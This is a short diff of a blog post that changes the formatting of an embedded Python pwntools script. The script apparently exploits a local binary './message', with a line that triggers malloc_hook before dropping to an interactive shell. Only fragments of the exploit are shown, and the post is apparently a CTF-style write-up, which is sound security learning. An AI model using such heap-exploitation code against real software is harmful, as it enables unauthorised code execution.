@@ -206,7 +206,7 @@ categories: [Sin categoría]
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>#!/usr/bin/python3
+```python
 from pwn import *
 #binary setup
 elf = context.binary = ELF('./message')
@@ -320,7 +320,7 @@ malloc(24, "Y") #trigger malloc_hook
 
 #========= interactive ====================
 r.interactive()
-</code></pre>
+```
 <!-- /wp:code -->
 
 <!-- wp:paragraph -->
